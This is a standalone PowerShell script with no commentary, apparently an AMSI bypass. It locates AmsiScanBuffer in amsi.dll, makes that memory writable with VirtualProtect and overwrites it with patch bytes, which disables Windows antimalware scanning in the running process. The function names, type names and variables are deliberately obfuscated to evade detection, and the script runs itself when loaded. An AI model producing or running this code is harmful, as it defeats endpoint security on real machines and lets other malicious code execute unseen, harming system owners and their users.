function get_delegate_type {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
        [Parameter(Position = 1)] [Type] $var_return_type = [Void]
    )
    $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
    $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
    return $var_type_builder.CreateType()
}
function get_proc_address {
    Param ($var_module, $var_procedure)     
    $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
    return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function Invoke-AMZZ {
    $ppruhu = get_proc_address amsi.dll "A@#m@#si@#S@#ca@#nBu@#ff@#e@#r".Replace("@#","")
    $virpro = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll VirtualProtect),(get_delegate_type (@([System.IntPtr], [System.UIntPtr], [System.UInt32], [System.UInt32].MakeByRefType())) ([System.Boolean])));$p = 0
    $virpro.Invoke($ppruhu, [UInt32]5, 0x40, [ref]$p)
    
    $scnfh = @([Byte] 0xB8, [Byte] 0x57, [Byte] 0x00,[Byte] 0x07, [Byte] 0x80, [Byte] 0xC3)
    $Ui6SdR=  [type]("{5}{3}{6}{9}{0}{2}{7}{4}{8}{1}" -F 'Ter','hal','o','sTem.R','i','sY','untiMe.i','psERV','ces.mArS','N');  (gI  ('vARI'+'Ab'+'Le'+':ui6s'+'dR')  )."v`AlUE"::("{0}{1}" -f 'Cop','y').Invoke(${s`cn`FH}, 0, ${PPr`Uhu}, 6)

}


Invoke-AMZZ






